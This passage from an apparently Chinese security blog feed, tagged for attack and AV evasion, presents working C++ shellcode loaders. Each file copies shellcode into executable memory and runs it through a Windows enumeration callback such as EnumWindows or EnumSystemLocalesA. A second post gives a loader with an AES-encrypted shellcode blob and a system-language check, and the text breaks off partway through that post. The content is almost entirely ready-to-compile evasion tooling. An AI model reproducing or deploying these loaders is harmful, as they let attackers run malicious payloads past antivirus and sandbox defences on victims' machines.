&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumChildWindows((HWND) NULL,(WNDENUMPROC) hAlloc,NULL);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumdateformatsacpp">EnumDateFormatsA.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumDateFormatsA((DATEFMT_ENUMPROCA)hAlloc , LOCALE_SYSTEM_DEFAULT, (DWORD) 0);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumdesktopwcpp">EnumDesktopW.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;#34;Wingdi.h&amp;#34;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW) hAlloc, NULL);
printf(&amp;#34;%d&amp;#34;, GetLastError());
VirtualFree(hAlloc,0, MEM_RELEASE);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumdesktopwindowscpp">EnumDesktopWindows.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()),
(WNDENUMPROC) hAlloc,
(LPARAM) NULL);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumsystemcodepagesacpp">EnumSystemCodePagesA.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)hAlloc ,0);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumsystemcodepageswcpp">EnumSystemCodePagesW.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
using namespace std;
// Create a string with last error message
std::string GetLastErrorStdStr()
{
DWORD error = GetLastError();
if (error)
{
LPVOID lpMsgBuf;
DWORD bufLen = FormatMessage(
FORMAT_MESSAGE_ALLOCATE_BUFFER |
FORMAT_MESSAGE_FROM_SYSTEM |
FORMAT_MESSAGE_IGNORE_INSERTS,
NULL,
error,
MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
(LPTSTR)&amp;amp;lpMsgBuf,
0, NULL);
if (bufLen)
{
LPCSTR lpMsgStr = (LPCSTR)lpMsgBuf;
std::string result(lpMsgStr, lpMsgStr + bufLen);
LocalFree(lpMsgBuf);
return result;
}
}
return std::string();
}
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)hAlloc, CP_INSTALLED);
printf(GetLastErrorStdStr().c_str());
VirtualFree(hAlloc,0, MEM_RELEASE);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumsystemgeoidcpp">EnumSystemGeoID.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumSystemGeoID(GEOCLASS_NATION,0,(GEO_ENUMPROC) hAlloc);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumsystemlanguagegroupsacpp">EnumSystemLanguageGroupsA.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA) hAlloc,LGRPID_SUPPORTED,0);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumsystemlocalesacpp">EnumSystemLocalesA.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>
//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumSystemLocalesA((LOCALE_ENUMPROCA)hAlloc ,NULL);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumthreadwindowscpp">EnumThreadWindows.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumThreadWindows(0,(WNDENUMPROC) hAlloc,0);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumuilanguagesacpp">EnumUILanguagesA.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumUILanguagesA((UILANGUAGE_ENUMPROCA)hAlloc, MUI_LANGUAGE_ID, 0);
}
&lt;/code>&lt;/pre>&lt;h2 id="enumwindowscpp">EnumWindows.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
static BOOL CALLBACK EnumWindowCallback(HWND hWnd, LPARAM lparam) {
//printf(&amp;#34;%S&amp;#34;, lparam);
return true;
}
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumWindows((WNDENUMPROC)hAlloc, NULL);
}
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="æ”»" label="æ”»"/><category scheme="https://if1sh.com/categories/%E5%85%8D%E6%9D%80/" term="å…æ€" label="å…æ€"/><category scheme="https://if1sh.com/tags/%E5%85%8D%E6%9D%80/" term="å…æ€" label="å…æ€"/></entry><entry><title type="text">reg shellcodeåŠ è½½å™¨</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/reg-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/><id>https://if1sh.com/posts/reg-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-20T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">#define _CRT_SECURE_NO_DEPRECATE #include &amp;#34;Base64.h&amp;#34; #include &amp;#34;AES.h&amp;#34; #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;Winnls.h&amp;gt; #pragma comment(lib,&amp;#34;Kernel32.lib&amp;#34;) #include &amp;lt;iostream&amp;gt; using namespace std; #define BUF_SIZE 4096 HKEY hKey; HKEY rootKey = HKEY_CURRENT_USER; DWORD cbData; static BOOL CALLBACK EnumWindowCallback(HWND hWnd, LPARAM lparam) { //printf(&amp;#34;%S&amp;#34;, lparam); return true;â€¦â€¦</summary><content type="html">&lt;pre tabindex="0">&lt;code>
#define _CRT_SECURE_NO_DEPRECATE
#include &amp;#34;Base64.h&amp;#34;
#include &amp;#34;AES.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;Winnls.h&amp;gt;
#pragma comment(lib,&amp;#34;Kernel32.lib&amp;#34;)
#include &amp;lt;iostream&amp;gt;
using namespace std;
#define BUF_SIZE 4096
HKEY hKey;
HKEY rootKey = HKEY_CURRENT_USER;
DWORD cbData;
static BOOL CALLBACK EnumWindowCallback(HWND hWnd, LPARAM lparam) {
//printf(&amp;#34;%S&amp;#34;, lparam);
return true;
}
const char g_key[17] = &amp;#34;asdfwetyhjuytrfd&amp;#34;;
const char g_iv[17] = &amp;#34;gfdertfghjkuyrtg&amp;#34;;//ECB MODEä¸éœ€è¦å…³å¿ƒchainï¼Œå¯ä»¥å¡«ç©º
string DecryptionAES(const string&amp;amp; strSrc) //AESè§£å¯†
{
string strData = base64_decode(strSrc);
size_t length = strData.length();
//å¯†æ–‡
char* szDataIn = new char[length + 1];
memcpy(szDataIn, strData.c_str(), length + 1);
//æ˜æ–‡
char* szDataOut = new char[length + 1];
memcpy(szDataOut, strData.c_str(), length + 1);
//è¿›è¡ŒAESçš„CBCæ¨¡å¼è§£å¯†
AES aes;
aes.MakeKey(g_key, g_iv, 16, 16);
aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);
//å»PKCS7Paddingå¡«å……
if (0x00 &amp;lt; szDataOut[length - 1] &amp;lt;= 0x16)
{
int tmp = szDataOut[length - 1];
for (int i = length - 1; i &amp;gt;= length - tmp; i--)
{
if (szDataOut[i] != tmp)
{
memset(szDataOut, 0, length);
cout &amp;lt;&amp;lt; &amp;#34;decode error&amp;#34; &amp;lt;&amp;lt; endl;
break;
}
else
szDataOut[i] = 0;
}
}
string strDest(szDataOut);
delete[] szDataIn;
delete[] szDataOut;
return strDest;
}
int main()
{
// check languge
LANGID test_id = GetSystemDefaultLangID();
if (test_id != 0x0804)
{
exit(0);
}
// åŠ å¯†åçš„shellcode
char buf[BUF_SIZE] = &amp;#34;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&amp;#34;;
// è§£å¯†shellcode
string strbuf = DecryptionAES(buf);
//cout &amp;lt;&amp;lt; &amp;#34;è§£å¯†åshellcodeï¼š&amp;#34; &amp;lt;&amp;lt; strbuf &amp;lt;&amp;lt; endl;
